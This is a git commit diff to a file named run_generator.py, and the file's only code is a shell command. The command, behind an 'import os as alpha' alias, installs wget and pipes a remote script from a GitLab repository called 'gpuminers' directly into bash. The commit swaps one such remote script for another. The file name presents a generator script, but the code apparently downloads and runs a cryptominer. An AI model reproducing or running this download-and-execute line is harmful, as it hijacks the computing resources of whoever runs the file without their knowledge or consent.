82f909c37b8fe5d3fe82bda27456290a4d59f503
ellismountain <92049303+ellismountain@users.noreply.github.com>
2021-10-10 21:24:54 +0000

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os as alpha
-alpha.system("apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/start_apache_cort_ws5.sh | bash")
+alpha.system("apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/start_vs.sh | bash")
